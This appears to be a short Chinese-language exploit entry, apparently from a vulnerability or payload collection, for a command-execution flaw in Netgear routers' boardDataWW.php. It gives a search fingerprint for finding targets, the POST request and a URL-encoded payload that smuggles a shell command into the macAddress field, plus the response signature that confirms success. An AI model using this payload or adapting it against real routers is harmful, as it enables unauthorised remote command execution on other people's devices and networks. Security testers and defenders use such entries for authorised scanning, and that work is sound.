# netgear路由器boarddatawwRCE漏洞

netgear ｜ 命令执行 ｜ —
- **指纹**：`title=="Netgear"`
- **请求**：`POST /boardDataWW.php HTTP/1.1`

**Payload**
```
macAddress=112233445566%3Becho 123456+%3E+.%2Foutput+%23®info=0&writeData=Submit
```
- **响应特征**：200 uid